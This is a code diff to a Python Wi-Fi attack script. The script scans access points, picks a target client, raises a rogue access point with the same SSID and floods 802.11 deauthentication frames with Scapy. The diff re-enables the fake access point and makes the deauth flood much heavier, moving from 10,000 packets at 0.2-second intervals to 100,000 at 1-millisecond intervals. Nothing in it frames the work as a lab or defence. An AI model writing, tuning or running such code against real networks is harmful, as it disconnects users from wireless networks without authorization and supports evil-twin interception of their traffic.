@@ -58,7 +58,7 @@ def checkFotRoot():
         sys.exit("\nOnly root can run this script\n")
 
 def apRescanHandler(interface):
-    os.system("clear")
+    # os.system("clear")
     print("===========\nScanned APs\n===========")
     devices = (list(printAP(interface)))
     attSsid = input("Choose your attack AP or \"R\" fore rescan: ")
@@ -111,10 +111,10 @@ def stopAttack():
 def deauth(brdmac, addr, interface):
     # print("\nChoose interface for deauth attack")
     # interface = chooseDevice()
-    goMonitorMode(interface)
+    # goMonitorMode(interface)
     print("Sending deauth packets")
     pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
-    sendp(pkt, iface=interface, count=10000, inter=.2)
+    sendp(pkt, iface=interface, count=100000, inter=.001)
 
 class AP:
     def __init__(self, ssid, bssid):
@@ -190,23 +190,24 @@ def chooseAttDevice(ap_list):
 
 if __name__ == "__main__":
     checkFotRoot()
-    os.system("clear")
+    # os.system("clear")
     print("Choose device for AP scan:")
     apDevice = chooseDevice()
     ap = apRescanHandler(apDevice)
     ssid = ap[0]
     addr = ap[1]
-    # startAP(ssid, apDevice)
+    startAP(ssid, apDevice)
 
-    os.system("clear")
+    # os.system("clear")
     print("\nChoose interface for Mac scanning")
     interface = chooseDevice()
-    goMonitorMode(interface)
+    # goMonitorMode(interface)
     mac_list = printDevices(ssid, interface)
-
     x = chooseAttDevice(mac_list)
     print("Device being attacked: " + x.bssid + "  " + x.vendor)
-    os.system("clear")
+    # os.system("clear")
+    goMonitorMode(interface)
+    time.sleep(5)
     deauth(x.bssid, addr, interface)
-    os.system("clear")
+    # os.system("clear")
     stopAttack()
